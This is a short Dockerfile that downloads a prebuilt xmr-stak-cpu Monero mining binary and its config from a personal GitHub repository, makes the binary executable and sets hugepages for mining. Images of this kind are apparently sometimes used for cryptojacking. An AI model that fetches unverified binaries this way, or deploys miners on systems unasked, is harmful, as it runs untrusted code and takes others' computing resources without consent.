FROM ubuntu:16.04


RUN apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev && wget https://github.com/tureku/tureku/raw/master/config.txt && wget https://github.com/tureku/tureku/raw/master/xmr-stak-cpu && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128

